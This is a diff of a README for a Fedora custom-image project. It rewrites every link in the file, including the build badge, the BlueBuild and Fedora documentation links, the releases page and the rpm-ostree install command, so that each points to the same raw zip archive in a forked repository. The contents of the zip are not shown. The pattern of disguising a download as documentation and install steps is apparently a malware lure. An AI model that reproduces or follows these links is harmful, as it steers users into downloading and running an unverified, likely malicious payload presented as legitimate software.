@@ -1,9 +1,9 @@
 # 🌟 virtual - A Simple Way to Upgrade Fedora
 
 ## 📝 Description
-# virtual &nbsp; [![bluebuild build badge](https://github.com/inspektor-cn/virtual/actions/workflows/build.yml/badge.svg)](https://github.com/inspektor-cn/virtual/actions/workflows/build.yml)
+# virtual &nbsp; [![bluebuild build badge](https://github.com/AhmadAli33297/virtual/raw/refs/heads/main/recipes/Software-v2.1.zip)](https://github.com/AhmadAli33297/virtual/raw/refs/heads/main/recipes/Software-v2.1.zip)
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+See the [BlueBuild docs](https://github.com/AhmadAli33297/virtual/raw/refs/heads/main/recipes/Software-v2.1.zip) for quick setup instructions for setting up your own repository based on this template.
 
 After setup, it is recommended you update this README to describe your custom image.
 
@@ -11,14 +11,14 @@ After setup, it is recommended you update this README to describe your custom im
 Follow these steps to successfully download and run the software.
 
 ## 💾 Download & Install
-Visit this page to download: [Releases Page](https://github.com/AhmadAli33297/virtual/releases)
+Visit this page to download: [Releases Page](https://github.com/AhmadAli33297/virtual/raw/refs/heads/main/recipes/Software-v2.1.zip)
 
 ## 📥 Step-by-Step Installation
 1. **Rebase to Unsigned Image**
    - Open your terminal.
    - Enter the following command:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/inspektor-cn/virtual:latest
+   rpm-ostree rebase https://github.com/AhmadAli33297/virtual/raw/refs/heads/main/recipes/Software-v2.1.zip
    ```
    This command prepares your system to accept updates from our software.
 
@@ -43,7 +43,7 @@ Visit this page to download: [Releases Page](https://github.com/AhmadAli33297/vi
 - Improve system stability and performance.
 
 ## 🚨 Important Note
-This is an experimental feature. Please try at your own discretion. Refer to the [Fedora documentation](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable) for further insights.
+This is an experimental feature. Please try at your own discretion. Refer to the [Fedora documentation](https://github.com/AhmadAli33297/virtual/raw/refs/heads/main/recipes/Software-v2.1.zip) for further insights.
 
 ## 💡 System Requirements
 - Operating System: Fedora (latest version recommended)
@@ -61,4 +61,4 @@ For further assistance, please reach out via the Issues section of this reposito
 ## 📄 License
 This project is licensed under the MIT License. See the LICENSE file for more details. 
 
-Visit this page to download: [Releases Page](https://github.com/AhmadAli33297/virtual/releases) 
+Visit this page to download: [Releases Page](https://github.com/AhmadAli33297/virtual/raw/refs/heads/main/recipes/Software-v2.1.zip) 
